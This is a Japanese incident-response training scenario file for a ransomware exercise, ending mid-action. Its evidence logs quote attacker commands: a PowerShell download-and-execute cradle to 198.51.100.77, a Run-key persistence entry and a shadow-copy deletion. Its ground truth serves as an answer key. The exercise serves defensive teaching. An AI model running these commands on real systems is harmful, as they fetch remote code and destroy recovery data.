@@ -1,0 +1,1469 @@
+schema_version: "0.4"
+
+meta:
+  id: ransomware-initial-response-01
+  title: "深夜のファイルサーバ異常"
+  version: "1.0.0"
+  author: "IR Dojo"
+  license: "CC-BY-4.0"
+  estimated_play_minutes: 10
+  language: ja
+  default_policy: damage_minimization
+  default_assist_level: assisted
+  briefing: |
+    03:12、監視センターから連絡。ファイルサーバ fs01 で
+    大量のファイル名変更が検知された。あなたは当直の
+    インシデント対応担当として招集された。
+
+    社内は 5 台の管理対象がある小規模拠点で、深夜帯の
+    在席者はいない。監視センターからの一次情報は
+    「fs01 でファイル名が次々に変わっている」のみである。
+  tags: [ransomware, initial-response, misleading-evidence]
+
+world:
+  assets:
+    - id: dc01
+      label: "ドメインコントローラ"
+      criticality: critical
+      depends_on: []
+      business_impact_per_hour: 80
+
+    - id: fs01
+      label: "ファイルサーバ"
+      criticality: high
+      depends_on: [dc01]
+      business_impact_per_hour: 50
+
+    - id: ws-042
+      label: "営業部端末 (佐藤)"
+      criticality: low
+      depends_on: [dc01]
+      business_impact_per_hour: 2
+
+    - id: ws-107
+      label: "経理部端末 (田中)"
+      criticality: low
+      depends_on: [dc01]
+      business_impact_per_hour: 2
+
+    - id: ws-113
+      label: "情報システム部端末 (鈴木)"
+      criticality: medium
+      depends_on: [dc01]
+      business_impact_per_hour: 4
+
+  ground_truth:
+    patient_zero: ws-042
+    compromised: [ws-042, fs01]
+    persistence: [ws-042]
+    innocent: [ws-107, ws-113]
+    attack_narrative: |
+      3/14 02:17、営業部の ws-042 がフィッシングメール経由で初期侵入を受けた。
+      添付された ISO ファイルの中に LNK とローダが同梱されており、
+      利用者がマウントして開いたことで難読化された PowerShell が起動している。
+
+      攻撃者は ws-042 上で認証情報を窃取し、02:34 に窃取した
+      CORP\\sato の資格情報で fs01 の共有へ SMB 接続した。
+      02:41 から fs01 上のファイルを順次暗号化し、拡張子を .lockd に変更した。
+
+      ws-042 には Run キーによる永続化が残されている。
+      端末を再起動しても再び C2 へ接続する状態にあった。
+
+      同時刻に観測された ws-107 の外部通信は、毎日 02:15 に起動する
+      クラウドバックアップの定時ジョブである。攻撃とは無関係。
+      ws-113 の管理者ログオンも、情報システム部による定例パッチ適用であり
+      攻撃とは無関係である。
+
+policies:
+  - id: business_continuity
+    label: "業務継続最優先"
+    briefing: |
+      経営判断により、基幹業務の停止は最終手段とする。
+      封じ込めは業務影響を最小化する形で実施すること。
+      証拠保全は可能な範囲で行えばよい。
+
+      基幹資産（fs01 / dc01）を止める場合は、
+      その資産が侵害されている根拠を示せる状態であること。
+    weights:
+      business_impact:          0.30
+      total_damage:             0.35
+      containment_completeness: 0.20
+      evidence_preserved:       0.15
+    constraints:
+      - type: forbid_containment_without_evidence
+        assets: [fs01, dc01]
+        message: "証拠なしに基幹資産を停止することは方針違反です"
+      # 全社に「端末を触るな」と流すことは、業務を止めることと同じである。
+      # 証拠は残るが、その日の仕事は止まる。この方針の下では取れない手。
+      - type: forbid_action
+        action_ids: [act_preservation_notice]
+        message: "全社への操作停止の周知は、業務を止めます"
+
+  - id: evidence_preservation
+    label: "証拠保全最優先"
+    briefing: |
+      法的対応の可能性があり、証拠保全を最優先とする。
+      揮発性証拠の確保を封じ込めに先行させること。
+
+      封じ込めによって失われる情報がある場合、
+      先に取得してから実施すること。
+    weights:
+      evidence_preserved:       0.45
+      containment_completeness: 0.25
+      total_damage:             0.20
+      business_impact:          0.10
+    constraints:
+      - type: require_before
+        action_type: contain
+        prerequisite_tags: [volatile_capture]
+        message: "封じ込め前に揮発性証拠の取得が必要です"
+
+  - id: damage_minimization
+    label: "被害最小化最優先"
+    briefing: |
+      被害拡大の阻止を最優先とする。
+      業務影響および証拠保全は二次的な考慮事項とする。
+
+      止めるべきものは、根拠が固まる前でも止めてよい。
+    weights:
+      total_damage:             0.50
+      containment_completeness: 0.30
+      business_impact:          0.10
+      evidence_preserved:       0.10
+    constraints: []
+
+evidence:
+  - id: ev_001
+    points_to: [ws-042]
+    misleading: false
+    plausibility: high
+    volatile: false
+    summary: "ws-042 で深夜に難読化 PowerShell が実行されている"
+    reading: |
+      EventID 4104 は PowerShell のスクリプトブロックログで、実行された
+      スクリプトの中身がそのまま記録される。EventID 4688 はプロセス作成の記録で、
+      ParentProcessName から起動元を辿れる。
+
+      コマンドラインの各オプション:
+        -enc   続く文字列が Base64（UTF-16LE）であることを示す
+        -w hidden  ウィンドウを表示しない
+        -nop   プロファイルスクリプトを読み込まない
+
+      SQBFAFgA... をデコードすると次になる:
+        IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')
+
+      IEX は Invoke-Expression の別名で、取得した文字列をその場で実行する。
+    content: |
+      EventID     : 4104
+      TimeCreated : 2026-03-14T02:17:33Z
+      Computer    : WS-042.corp.local
+      UserId      : CORP\sato
+      LogName     : Microsoft-Windows-PowerShell/Operational
+      ScriptBlockText:
+        powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj
+        AHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQ
+        AUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMA
+        AuADcANwAvAGEALgBwAHMAMQAnACkA
+
+      EventID     : 4688
+      TimeCreated : 2026-03-14T02:17:31Z
+      Computer    : WS-042.corp.local
+      NewProcessName   : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      ParentProcessName: C:\Windows\explorer.exe
+      CommandLine      : powershell -nop -w hidden -enc SQBFAFgA...
+
+  - id: ev_002
+    points_to: [fs01]
+    misleading: false
+    plausibility: high
+    volatile: false
+    summary: "fs01 上のファイルが 02:41 以降に大量改変されている"
+    reading: |
+      ファイル監査ログの行は「時刻 ホスト 旧パス -> 新パス」の形。
+      拡張子が一律に同じものへ変わり、各ディレクトリに同一内容のテキストファイルが
+      置かれる形は、ファイル暗号化型マルウェアに広く共通する挙動である。
+
+      件数と時間幅（12,847件 / 約29分）から、人手ではなく自動化された処理と読める。
+    content: |
+      2026-03-14 02:41:07  fs01  \\share\経理\FY2025_予算.xlsx      -> FY2025_予算.xlsx.lockd
+      2026-03-14 02:41:07  fs01  \\share\経理\FY2025_実績.xlsx      -> FY2025_実績.xlsx.lockd
+      2026-03-14 02:41:09  fs01  \\share\経理\12月_支払一覧.docx    -> 12月_支払一覧.docx.lockd
+      2026-03-14 02:41:09  fs01  \\share\営業\顧客名簿.xlsx         -> 顧客名簿.xlsx.lockd
+      ...
+      合計 12,847 件 (02:41:07 - 03:09:52)
+
+      各ディレクトリに同一内容のファイルが生成されている:
+      \\share\経理\_HOW_TO_RESTORE_.txt   (2026-03-14 02:41:07, 1,204 bytes)
+
+  - id: ev_003
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "ws-107 には毎日 02:15 起動の定時バックアップジョブが登録されている"
+    reading: |
+      バックアップ運用台帳の読み方。「起動時刻」はタスクスケジューラに
+      登録された定期実行の時刻、「平均転送量」は過去実績の平均を指す。
+
+      直近30日の実行履歴が 30/30 成功で転送量も 400-520MB に収まっている場合、
+      その通信は定常運用の範囲にあると言える。異常かどうかは、この平常時の姿と
+      比べて初めて判定できる。
+    content: |
+      # 資産管理システム / バックアップ運用台帳より抜粋
+
+      対象ホスト : WS-107.corp.local
+      ジョブ名   : nightly-cloud-sync
+      起動時刻   : 毎日 02:15 (タスクスケジューラ)
+      宛先       : backup.example.com (198.51.100.0/24)
+      平均転送量 : 420 - 510 MB
+      登録日     : 2024-06-03
+      登録者     : CORP\suzuki (情報システム部)
+
+      直近30日の実行履歴: 30/30 成功。転送量は 400-520MB の範囲で安定。
+
+  - id: ev_004
+    points_to: [ws-042]
+    misleading: false
+    plausibility: high
+    volatile: false
+    summary: "ws-042 宛に ISO 添付のフィッシングメールが 02:11 に配送されている"
+    reading: |
+      メールゲートウェイの配送ログ。認証結果の読み方:
+        spf: softfail  送信元IPが差出人ドメインの許可リストにない（緩い失敗）
+        dkim: none     電子署名が付いていない
+
+      ISO や VHD の添付は、展開したファイルに Mark-of-the-Web が引き継がれないため、
+      Windows の警告表示を回避できる形式として知られる。
+
+      Microsoft-Windows-VHDMP/Operational の EventID 1 は
+      ディスクイメージのマウントを記録する。
+    content: |
+      # メールゲートウェイ配送ログ
+
+      2026-03-14 02:11:48  queue_id=4B2F91A0C7
+        from    : billing@example.org
+        to      : sato@example.com
+        subject : 【至急】3月分 請求書の再送について
+        attach  : invoice_202603.iso (1,438,720 bytes)
+        spf     : softfail
+        dkim    : none
+        verdict : delivered (添付形式の隔離ポリシー対象外)
+
+      2026-03-14 02:16:52  WS-042 上で invoice_202603.iso がマウントされている
+        (Microsoft-Windows-VHDMP/Operational, EventID 1)
+        マウント内容: invoice_202603.lnk, sys32.dll
+
+  - id: ev_005
+    points_to: [ws-113]
+    misleading: true
+    plausibility: medium
+    volatile: false
+    summary: "ws-113 から深夜に管理者権限のログオンが行われている"
+    reading: |
+      dc01 のセキュリティログ。
+        EventID 4624  ログオン成功
+        EventID 4672  特権が割り当てられたログオン
+        LogonType 3   ネットワーク経由のログオン（共有アクセス等）
+
+      特権の意味:
+        SeBackupPrivilege  アクセス権を無視してファイルを読める
+        SeDebugPrivilege   他プロセスのメモリに触れる
+        SeTcbPrivilege     OS の一部として動作できる
+
+      深夜帯の管理者ログオンは、攻撃でも保守作業でも同じように記録される。
+      記録そのものからは用途を決められない。
+    content: |
+      # dc01 セキュリティログ
+
+      EventID     : 4624
+      TimeCreated : 2026-03-14T02:22:10Z
+      Computer    : DC01.corp.local
+      TargetUserName : CORP\suzuki_adm
+      LogonType   : 3 (Network)
+      WorkstationName : WS-113
+      IpAddress   : 192.0.2.113
+
+      EventID     : 4672   (特権ログオン)
+      TimeCreated : 2026-03-14T02:22:10Z
+      TargetUserName : CORP\suzuki_adm
+      Privileges  : SeBackupPrivilege, SeDebugPrivilege, SeTcbPrivilege
+
+      以降 02:22 - 03:40 の間に 41 件の同種ログオンが記録されている。
+    refuted_by: [ev_008]
+
+  - id: ev_006
+    points_to: [ws-042]
+    misleading: false
+    plausibility: high
+    volatile: false
+    summary: "ws-042 から fs01 へ、窃取された資格情報で SMB 接続が行われている"
+    reading: |
+      fs01 側のログ。
+        EventID 4624  ログオン成功（LogonType 3 = ネットワーク）
+        EventID 5140  共有オブジェクトへのアクセス
+
+      AccessMask はビットの組み合わせ:
+        0x1 ReadData / 0x2 WriteData / 0x10000 Delete
+
+      AuthenticationPackageName は使われた認証方式。ドメイン環境では通常
+      Kerberos が使われ、NTLM は資格情報そのものを提示する古い方式である。
+      「過去90日で NTLM 0件」はベースラインの提示で、
+      普段と違うことが起きたかどうかを判断するための材料になる。
+    content: |
+      # fs01 SMB セッションログ / セキュリティログ
+
+      EventID     : 4624
+      TimeCreated : 2026-03-14T02:34:02Z
+      Computer    : FS01.corp.local
+      TargetUserName : CORP\sato
+      LogonType   : 3 (Network)
+      IpAddress   : 192.0.2.42        <- WS-042
+      AuthenticationPackageName : NTLM
+
+      注: CORP\sato は通常 Kerberos で認証している。
+          NTLM での認証は過去90日間で 0 件。
+
+      EventID     : 5140   (共有オブジェクトへのアクセス)
+      TimeCreated : 2026-03-14T02:34:04Z
+      ShareName   : \\*\share
+      AccessMask  : 0x1 (ReadData) | 0x2 (WriteData) | 0x10000 (Delete)
+
+  - id: ev_007
+    points_to: [ws-107]
+    misleading: true
+    plausibility: high
+    volatile: false
+    summary: "ws-107 が同時刻に外部へ大量通信している"
+    reading: |
+      NetFlow はパケットの中身を記録せず、通信の外形だけを残す。
+        bytes_out  送信バイト数
+        bytes_in   受信バイト数
+        duration   接続の継続時間（秒）
+        ja3        TLS ClientHello の特徴から作るクライアント側の指紋
+
+      ja3 が同じなら同じクライアント実装である可能性が高いが、
+      正規のソフトウェアも固有の ja3 を持つ。
+
+      通信量が大きいことは、それ自体では用途を決めない。
+      何を送ったかは NetFlow からは分からない。
+    content: |
+      # ネットワークフロー (NetFlow v9)
+
+      2026-03-14 02:19:41  ws-107.corp.local:51204 -> 198.51.100.22:443
+        bytes_out = 482,113,920
+        bytes_in  = 1,204,338
+        duration  = 1841s
+        proto     = TCP
+        ja3       = a0e9f5b8c1d47e02f3a6b9c8d1e40527
+
+      同時間帯の他ホスト:
+        ws-042  -> 198.51.100.77:443   bytes_out=18,204     duration=3910s
+        ws-113  -> 192.0.2.10:445      bytes_out=2,118,004  duration=88s
+    refuted_by: [ev_003]
+
+  - id: ev_008
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "3/14 深夜は情報システム部による定例パッチ適用の作業時間帯である"
+    reading: |
+      変更管理台帳の読み方。「変更番号」は申請の識別子、
+      「作業時間帯」は承認された実施予定の枠、「承認」は承認された日付を指す。
+
+      配布サーバ経由でパッチを配る運用では、作業端末から各端末への
+      ネットワークログオンが多数発生する。これは作業に伴う正常な挙動として
+      台帳の備考に書かれることが多い。
+    content: |
+      # 変更管理台帳 / 資産管理台帳より抜粋
+
+      変更番号  : CHG-2026-0271
+      作業名    : 3月度 定例セキュリティパッチ適用
+      作業時間帯: 2026-03-14 02:00 - 04:00
+      作業端末  : WS-113.corp.local
+      実施者    : CORP\suzuki_adm (情報システム部 鈴木)
+      対象      : 全ドメイン参加端末 (5台)
+      承認      : 2026-03-06 承認済
+
+      備考: 配布には dc01 の共有を使用するため、
+            作業端末から多数のネットワークログオンが発生する。
+
+  - id: ev_009
+    points_to: [ws-042]
+    misleading: false
+    plausibility: high
+    volatile: true
+    summary: "ws-042 のメモリ上に C2 設定と Run キーによる永続化が残っている"
+    reading: |
+      メモリイメージの解析結果。
+        PID / PPID     プロセスIDと親プロセスID。親子関係から起動経路を辿れる
+        ESTABLISHED    その時点で確立していた TCP 接続
+
+      メモリ上の文字列に現れる sleep と jitter は、
+      一定間隔＋ゆらぎで外部へ問い合わせる動作の設定値としてよく使われる。
+
+      HKCU\...\CurrentVersion\Run に登録された値は、そのユーザのログオン時に
+      自動実行される。ここに登録があるということは、再起動しても同じものが
+      また動くということを意味する。
+
+      これらは端末が動いている間しかメモリに存在しない。
+    content: |
+      # ws-042 メモリイメージ解析結果
+
+      [プロセス]
+      PID 4812  powershell.exe   PPID 3120 (explorer.exe)  Start 02:17:31
+        接続中: 198.51.100.77:443  (ESTABLISHED, 3910s)
+
+      [メモリ上の文字列]
+        hxxps://198.51.100.77/gate.php
+        sleep=60 jitter=15
+        AES key: 3f9a1c...（32 bytes)
+
+      [永続化]
+      HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+        "OneDriveSync" = "powershell -nop -w hidden -enc SQBFAFgA..."
+        書き込み時刻: 2026-03-14T02:18:02Z
+
+      注: この端末を再起動しても、この Run キーにより再度 C2 へ接続する。
+
+  - id: ev_010
+    points_to: [fs01]
+    misleading: false
+    plausibility: high
+    volatile: true
+    summary: "fs01 上で暗号化バイナリが稼働している"
+    reading: |
+      プロセス一覧の読み方。
+        署名なし              発行元が検証できない実行ファイル
+        C:\Windows\Temp から  正規のシステムプロセスが通常置かれない場所
+        ファイルハンドル履歴  そのプロセスが開いたファイルの記録
+
+      svchost32.exe のように、正規のプロセス名（svchost.exe）に似せた名前は
+      一覧を目で追ったときに見落とされやすい。
+
+      停止したプロセスの情報はメモリにしか残らない。
+    content: |
+      # fs01 メモリイメージ / プロセス一覧
+
+      PID 6644  svchost32.exe   PPID 1  Start 02:40:58
+        Path   : C:\Windows\Temp\svchost32.exe
+        署名   : なし
+        ハンドル: \\?\C:\share\... (12,847 件のファイルハンドル履歴)
+
+      [メモリ上の文字列]
+        .lockd
+        _HOW_TO_RESTORE_.txt
+        C:\share\
+
+      注: このプロセスは fs01 停止時に失われる。
+
+  - id: ev_011
+    points_to: [ws-042]
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "ws-042 の外部通信は少量で、C2 の常時接続に一致する"
+    reading: |
+      プロキシログを1接続単位に集計したもの。読みどころは3つ。
+
+        平均間隔 60.2s に jitter あり — 一定周期＋ゆらぎで問い合わせる形
+        bytes_out が小さく bytes_in が大きい — 送るより受け取る方が多い
+        リクエスト数 65 / 約65分 — 人の操作にしては規則的すぎる
+
+      データを外へ運ぶ通信は送信側が大きくなる。
+      指示を受け取る通信は受信側が大きくなる。どちらの形かで用途が分かれる。
+    content: |
+      # プロキシ / 境界ファイアウォールログ
+
+      2026-03-14 02:17:35 - 03:22:45   ws-042 -> 198.51.100.77:443
+        リクエスト数 : 65
+        平均間隔     : 60.2s  (jitter あり)
+        bytes_out    : 18,204   (合計)
+        bytes_in     : 402,118  (合計)
+        User-Agent   : Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+      注: 通信量は小さく、周期性が明確。データ持ち出しではなく
+          コマンド＆コントロールの挙動に一致する。
+
+  - id: ev_012
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "DLP に大容量の外部送信は記録されていない"
+    reading: |
+      DLP / CASB は、機密情報が外部へ出ていないかを監視する仕組み。
+      「検知0件」は、ポリシーで定義した条件に合う送信が観測されなかったことを意味する。
+
+      承認済み宛先への送信は検知対象から外れる設定になっていることが多いので、
+      検知0件と「外部送信がなかった」は同義ではない。
+      承認済みの欄に何が記録されているかも併せて見る必要がある。
+    content: |
+      # DLP / CASB ログ (2026-03-14 00:00 - 04:00)
+
+      検知ポリシー「機密ファイルの外部送信」: 検知 0 件
+
+      承認済み宛先への送信:
+        02:15:12  ws-107 -> backup.example.com   482 MB   (nightly-cloud-sync / 許可)
+
+      未承認宛先への 10MB 超の送信: 0 件
+
+      注: fs01 の共有からの読み出しは 12,847 件記録されているが、
+          いずれも社内 IP 宛であり外部送信は観測されていない。
+
+  - id: ev_013
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "ws-113 に不審な実行痕跡は見つからない"
+    reading: |
+      端末トリアージの自動収集結果。確認している項目:
+        自動起動項目      ログオンや起動のたびに実行されるもの
+        直近の実行履歴    ShimCache / Amcache 等に残る実行痕跡
+        スケジュールタスク 時刻や条件で起動する登録
+        永続化の痕跡      再起動をまたいで生き残る仕掛け
+
+      wusa.exe は Windows Update スタンドアロンインストーラ、
+      gpupdate.exe はグループポリシーの適用コマンドで、いずれも OS 標準のもの。
+    content: |
+      # ws-113 トリアージ結果 (自動収集)
+
+      自動起動項目      : 登録 24 件。すべて既知の管理エージェントと署名済み
+      直近30日の新規実行: 18 件。すべて WSUS / 配布サーバ由来
+      スケジュールタスク: 変更なし
+      永続化の痕跡      : 検出なし
+      不審な親子関係    : 検出なし
+
+      02:00 - 04:00 の実行履歴:
+        02:03:11  wusa.exe        /quiet /norestart  (CHG-2026-0271)
+        02:44:52  wusa.exe        /quiet /norestart  (CHG-2026-0271)
+        03:31:08  gpupdate.exe    /force
+
+      注: この端末に攻撃の痕跡は認められない。
+
+  - id: ev_014
+    points_to: [ws-042]
+    misleading: false
+    plausibility: high
+    volatile: false
+    summary: "ws-042 のディスクに ISO のマウントと LNK 実行の痕跡が残っている"
+    reading: |
+      ディスクイメージから取れる痕跡。
+        $MFT        NTFS のファイル管理表。作成・更新時刻が残る
+        RecentDocs / LNK  開いたファイルのショートカット。実行時刻と引数が残る
+        ShimCache   実行されたファイルのパスと時刻がレジストリに残る
+
+      これらは端末を停止しても消えない。逆に、稼働中のメモリにしかない情報
+      （実行中プロセス、確立中の接続）は、停止した時点で失われる。
+
+      どちらを取るかは順序の問題であり、両方は取れない。
+    content: |
+      # ws-042 ディスクイメージ解析 (取得のため端末をシャットダウン)
+
+      $MFT より:
+        \Users\sato\Downloads\invoice_202603.iso   作成 2026-03-14T02:16:31Z
+        \Users\sato\AppData\Local\Temp\sys32.dll  作成 2026-03-14T02:17:28Z
+
+      RecentDocs / LNK:
+        invoice_202603.lnk  最終実行 2026-03-14T02:17:29Z
+        引数: /c start powershell -nop -w hidden -enc SQBFAFgA...
+
+      ShimCache:
+        2026-03-14T02:17:31Z  powershell.exe
+        2026-03-14T02:34:00Z  net.exe  use \\FS01\share
+
+      注: 初期侵入がこの端末で起きたことが、端末側の痕跡から裏づけられる。
+
+  - id: ev_015
+    points_to: [fs01]
+    misleading: false
+    plausibility: high
+    volatile: false
+    summary: "fs01 でシャドウコピーが削除され、暗号化バイナリ本体が残っている"
+    reading: |
+      EventID 524 (Backup) はバックアップ関連の操作記録。
+      そこに記録されている vssadmin delete shadows /all /quiet は、
+      ボリュームシャドウコピー（Windows の復元ポイント）を全削除するコマンド。
+
+      シャドウコピーを消しておくと、暗号化されたファイルを
+      OS の機能で元に戻せなくなる。
+
+      「自動起動項目: 登録なし」は、この端末に再起動をまたぐ仕掛けが
+      残っていないことを示す。
+    content: |
+      # fs01 セーフモード起動後の確認 (稼働中のメモリは失われる)
+
+      イベントログ:
+        EventID 524 (Backup)  2026-03-14T02:40:41Z
+          vssadmin delete shadows /all /quiet
+
+      ファイル:
+        C:\Windows\Temp\svchost32.exe   1,208,832 bytes
+          作成 2026-03-14T02:40:12Z   署名なし
+          SHA-256: 0000000000000000000000000000000000000000000000000000000000000000
+                   (架空の値)
+
+      自動起動項目: 登録なし（この端末に永続化は仕掛けられていない）
+
+  - id: ev_016
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "佐藤とは連絡が取れない"
+    reading: |
+      聞き取りは、端末の記録に残らないことを埋める唯一の手段である。
+      「心当たりのあるメールを開いたか」「見慣れない画面が出たか」は
+      ログには残らない。
+
+      つながらなかったという事実そのものは、攻撃の有無を何も語らない。
+      ただしこの経路が今は使えないことは分かったので、
+      以降は機器側の記録だけで組み立てることになる。
+    content: |
+      # 対応記録
+
+      2026-03-14 03:2x  営業部 佐藤 宛に架電
+        携帯（登録番号）  呼出のみ、応答なし  ×3
+        自宅（緊急連絡先）呼出のみ、応答なし  ×1
+        社用チャット      未読
+
+        管理職経由での連絡も試行。深夜帯につき同様に応答なし。
+
+      備考: 本人からの申告が得られないため、端末上で何が行われたかは
+            機器側の記録から判断する必要がある。
+
+  - id: ev_017
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "EDR のフルスキャンで既知の検体は検出されない"
+    reading: |
+      フルスキャンが照合しているのは既知の検体のハッシュやパターンである。
+      検出0は「マルウェアがいない」ではなく「既知のものは無い」を意味する。
+
+      スクリプトだけで完結する攻撃や、ディスクに実行ファイルを残さない攻撃、
+      まだ登録されていない検体は、この方法では見つからない。
+      検出0のときは、別の観点（実行の痕跡、通信、認証）で見る必要がある。
+    content: |
+      # EDR フルスキャン結果 (5台)
+
+        DC01     完了  検出 0
+        FS01     完了  検出 0
+        WS-042   完了  検出 0
+        WS-107   完了  検出 0
+        WS-113   完了  検出 0
+
+        定義ファイル : 2026-03-13 22:10 更新（最新）
+        スキャン範囲 : 全ドライブ / アーカイブ内も展開
+
+      備考: シグネチャに一致するファイルは見つからなかった。
+
+  - id: ev_018
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "バックアップは健全で、暗号化前の世代から復元できる"
+    reading: |
+      ランサムウェア対応では、復旧できるかどうかが以降の選択肢を決める。
+      復旧できるなら、身代金の検討も、業務停止の許容度も変わる。
+
+      確認しているのは3点。暗号化開始より前の世代があるか、
+      その世代が壊れていないか、保管先まで攻撃者の手が届いていないか。
+      バックアップそのものを暗号化・削除してから本体を暗号化する手口があるため、
+      3つ目は特に重要になる。
+
+      なお、これは復旧の話であって、どの資産が侵害されたかとは別の問いである。
+    content: |
+      # バックアップ健全性確認
+
+        最新世代    : 2026-03-14 01:00 取得（暗号化開始の 01:41 前）
+        整合性検証  : OK（チェックサム一致）
+        復元テスト  : \\share\経理 から 20 ファイルを別領域へ復元 → 成功
+        保管先      : オフサイト。3/13 22:00 以降 書き込み要求なし
+
+        世代保持    : 日次 14世代 / 週次 8世代
+
+      備考: 暗号化された領域は、この世代から復旧できる見込み。
+
+  - id: ev_019
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "特権グループのメンバーに変更はない"
+    reading: |
+      攻撃者はしばしば、後で戻れるように特権グループへ自分のアカウントを
+      足す。4728 / 4732 / 4756 はその追加を記録するイベントである。
+
+      変更0件は、その手口が使われていないことを示す。
+      ただし、既存の特権アカウントの資格情報を盗んで使う場合は、
+      グループに変更が入らないので、この確認では捕まらない。
+    content: |
+      # Active Directory 特権グループ 変更履歴 (直近30日)
+
+        Domain Admins          変更 0 件（現在 2 名: administrator, suzuki_adm）
+        Enterprise Admins      変更 0 件（現在 1 名: administrator）
+        Schema Admins          変更 0 件
+        Backup Operators       変更 0 件（現在 1 名: suzuki_adm）
+
+        EventID 4728/4732/4756（グループへの追加）: 該当なし
+
+      備考: 攻撃者によるアカウントの追加・昇格は行われていない。
+
+open_questions:
+  - id: q_initial_access
+    label: "初期侵入経路"
+    question: "攻撃者はどこから侵入したか"
+    resolved_by: [ev_004, ev_014]
+    resolution_mode: any
+    critical: true
+    implication: |
+      未解消のまま封じ込めても、同じ経路から他の端末が
+      侵害される可能性が残ります。侵入経路を塞がない限り、
+      封じ込めは時間稼ぎにしかなりません。
+
+  - id: q_lateral_movement
+    label: "横展開の経路"
+    question: "ws-042 から fs01 へどう到達したか"
+    resolved_by: [ev_006]
+    resolution_mode: any
+    critical: true
+    implication: |
+      経路が不明なままでは、同じ手法で到達可能な
+      他の資産を特定できません。窃取された資格情報が
+      使われている場合、隔離だけでは止まりません。
+
+  - id: q_persistence
+    label: "永続化の有無"
+    question: "再起動しても攻撃者が戻ってくる状態か"
+    resolved_by: [ev_009]
+    resolution_mode: any
+    critical: true
+    implication: |
+      永続化を確認しないまま隔離を解くと、端末は再び C2 へ接続します。
+      稼働中のメモリにしか残らない情報であり、
+      端末を停止した時点で確認する手段は失われます。
+
+  - id: q_exfiltration
+    label: "データ持ち出しの有無"
+    question: "外部通信は持ち出しか C2 か"
+    resolved_by: [ev_011, ev_012]
+    resolution_mode: all
+    critical: false
+    implication: |
+      持ち出しの有無は、個人情報保護法上の報告義務と
+      顧客通知の要否の判断に直結します。
+
+actions:
+  # ── 調査 ──
+  - id: act_collect_evtx_fs01
+    label: "fs01 のイベントログを収集・解析"
+    command: |
+      $ wevtutil epl Security C:\ir\fs01_sec.evtx /r:FS01
+      $ wevtutil epl Microsoft-Windows-PowerShell/Operational C:\ir\fs01_ps.evtx /r:FS01
+        2 files exported (184 MB)
+
+      $ Get-WinEvent -Path C:\ir\fs01_sec.evtx -FilterXPath "*[System[TimeCreated[@SystemTime>='2026-03-14T00:00:00Z']]]"
+        4,281 events
+      $ Get-WinEvent -Path C:\ir\fs01_ps.evtx | Where-Object Id -eq 4104
+        1,164 events
+
+      $ Get-Content \\FS01\c$\Windows\System32\LogFiles\fileaudit.log | Measure-Object -Line
+        Lines : 138,402
+    group: "fs01（ファイルサーバ）"
+    phase: investigation
+    type: investigate
+    description: |
+      fs01 のセキュリティログ、PowerShell 操作ログ、ファイル監査ログを
+      まとめて取得し、時系列に並べる。サーバ側から見て「誰が・いつ・何をしたか」を
+      洗い出す作業。
+    cost_minutes: 30
+    investigates: [fs01]
+    yields: [ev_001, ev_002]
+
+  - id: act_netflow_overview
+    label: "ネットワークフローの概況確認"
+    command: |
+      $ nfdump -R /var/netflow/2026-03-14 -t 2026/03/14.00:00-04:00 -s record/bytes -n 20
+        Aggregated flows : 41,208
+        Top 20 by bytes  : listed
+
+      $ nfdump -R /var/netflow/2026-03-14 -t 2026/03/14.00:00-04:00 'dst net not 192.0.2.0/24'
+        Matched flows : 1,933  (egress only)
+    group: "全体を横断して見る"
+    phase: investigation
+    type: investigate
+    description: |
+      境界とコアスイッチのフロー情報から、深夜帯の通信を通信量順に並べる。
+      通信の中身は見えないが、どの端末がどこへどれだけ話したかが分かる。
+    cost_minutes: 20
+    investigates: [ws-042, ws-107, ws-113]
+    yields: [ev_007]
+
+  - id: act_asset_inventory
+    label: "資産管理台帳・変更管理台帳の照会"
+    command: |
+      $ curl -s "https://cmdb.corp.local/api/assets?site=HQ" | jq '.[] | {id,owner,role}'
+        5 records
+
+      $ curl -s "https://cmdb.corp.local/api/changes?from=2026-03-13&to=2026-03-14" | jq length
+        3 records
+    group: "台帳・運用の記録"
+    phase: investigation
+    type: investigate
+    description: |
+      資産管理台帳と変更管理台帳を引き、各端末の用途・管理者と、
+      この時間帯に承認済みの作業が入っていないかを確認する。
+      異常かどうかを判定するには、平常時の姿を知る必要がある。
+    cost_minutes: 10
+    investigates: []
+    yields: [ev_008]
+
+  - id: act_dc_authlog
+    label: "dc01 の認証ログを確認"
+    command: |
+      $ Get-WinEvent -ComputerName DC01 -FilterHashtable @{
+            LogName='Security'; Id=4624,4625,4672;
+            StartTime='2026-03-14 00:00'; EndTime='2026-03-14 04:00' }
+        1,507 events
+
+      $ ... | Group-Object {$_.Properties[5].Value} | Sort Count -Descending
+        18 distinct accounts
+    group: "dc01（ドメインコントローラ）"
+    phase: investigation
+    type: investigate
+    description: |
+      ドメインコントローラのセキュリティログから、深夜帯の認証イベントを抽出する。
+      誰がどの端末からドメインにログオンしたかを見る。
+    cost_minutes: 25
+    investigates: [dc01, ws-113]
+    yields: [ev_005]
+
+  - id: act_interview_sato
+    label: "利用者（佐藤）に連絡して聞き取り"
+    requires_evidence: [ev_001, ev_007]
+    command: |
+      $ 架電 03:21  携帯（登録番号）      呼出 30秒 → 応答なし
+      $ 架電 03:24  携帯（登録番号）      呼出 30秒 → 応答なし
+      $ 架電 03:29  自宅（緊急連絡先）    呼出 30秒 → 応答なし
+      $ 社用チャット DM 送信 03:31        既読なし
+      $ 架電 03:38  上長経由              呼出 30秒 → 応答なし
